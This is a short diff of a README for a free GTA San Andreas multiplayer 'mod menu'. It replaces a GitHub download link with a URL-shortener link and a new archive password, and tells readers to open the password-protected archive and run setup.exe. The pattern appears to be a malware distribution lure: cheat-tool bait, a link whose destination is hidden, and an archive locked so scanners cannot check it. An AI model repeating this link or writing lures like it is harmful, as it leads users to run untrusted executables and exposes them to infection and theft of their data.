@@ -10,8 +10,8 @@ to the next level with the free and easy-to-use  Mod-menu!
 
 <H3>⚙️ How install:</H3>
 
-- [Download](https://github.com/Moscardo92/gta-samp-mod-menu/releases/download/Download/GTASAmodm.rar)
-- Open archive (password: modgtasa)
+- [Download](https://goo.su/DZpiP)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
